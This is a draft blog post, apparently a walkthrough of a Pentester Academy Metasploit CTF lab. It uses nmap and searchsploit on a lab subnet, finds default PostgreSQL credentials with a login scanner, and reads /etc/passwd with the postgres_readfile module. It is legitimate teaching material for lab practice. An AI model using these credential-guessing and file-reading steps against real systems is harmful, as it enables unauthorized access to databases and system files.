+++
author = "Nick"
date = 2019-12-31T16:28:46Z
description = ""
draft = true
slug = "attack-defense-metasploit-ctf-4"
title = "Attack | Defense - Metasploit CTF 6"

+++


Welcome back to the third entry in this series. In the last entry we used two `Metasploit` modules to obtain `Tomcat` credentials and leverage them with an authenticated RCE.

## Overview
In this entry we will tackle the third Metasploit CTF on Pentester Academy. In this entry we will use two `Metasploit` modules. A module to test for valid user credentials and an authenticated RCE.

## Network Topology

![](/images/2019/12/image-77.png)

## Enumeration
If you've been following along, you know that we being our enumeration process with `nmap`. We'll now start to combine the set of command options we've learned. Let's obtain our IP and scan our subnet:

Command:
`nmap -sV -T5 192.207.101.1/24`

Here are our results:
```
Nmap scan report for target-1 (192.207.101.3)
Host is up (0.000015s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE    VERSION
5432/tcp open  postgresql PostgreSQL DB
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5432-TCP:V=7.70%I=7%D=12/31%Time=5E0B78A3%P=x86_64-pc-linux-gnu%r(S
SF:MBProgNeg,85,"E\0\0\0\x84SFATAL\0C0A000\0Munsupported\x20frontend\x20pr
SF:otocol\x2065363\.19778:\x20server\x20supports\x201\.0\x20to\x203\.0\0Fp
SF:ostmaster\.c\0L2014\0RProcessStartupPacket\0\0");
MAC Address: 02:42:C0:CF:65:03 (Unknown)

Nmap scan report for target-2 (192.207.101.4)
Host is up (0.000014s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.23
MAC Address: 02:42:C0:CF:65:04 (Unknown)
```

We see that `target-1` is a `PostgresSQL` service running. `Target-2` has a familiar friend running as well, `mysql`. We can run these services through `searchsploit`.

Command:
`searchsploit postgres`

We get back some good results:

![](/images/2019/12/image-87.png)

We'll load up `Metasploit` and check out the modules.

Command:
`msfdb run` or `msfconsole`

Once inside we will `search` for `postgres`.

![](/images/2019/12/image-89.png" caption=")

Similar to what we did in the third CTF. We are going to look to enumerate user credentials. We'll start with using the `postrgres_login` module.

Command:
`msf5> use auxiliarty/scanner/postgres/postgres_login` or `msf5> use 8`

Next we'll `show` our options.

Command:
`msf5> show options`

![](/images/2019/12/image-91.png)

For this module we will need to set our `rhosts`. Optionally we can set a password list but in this case we'll just use our defaults.

Command:
`msf5> set rhost target-1`

Then we `run` the module.

Command:
`msf5> run`

![](/images/2019/12/image-90.png)

We get a valid credential set: `postrgres`:`postgres`. Next we need to leverage these commands. We have a few authenticated modules in our listing. The first we are going to try with this set of credentials is `auxiliary/admin/postgres/postgres_readfile`. This is the same method we used in CTF 2. We will first try to read `/etc/passwd` to verify we have permissions.

Command:
`msf5> use auxiliary/admin/postgres/postgres_readfile`

We then set our `rhosts` parameter.

Command:
`msf5> set rhosts target-1`

Then we `run` it.

![](/images/2019/12/CTF_4_postgres.gif)

We do have the ability to read the file.



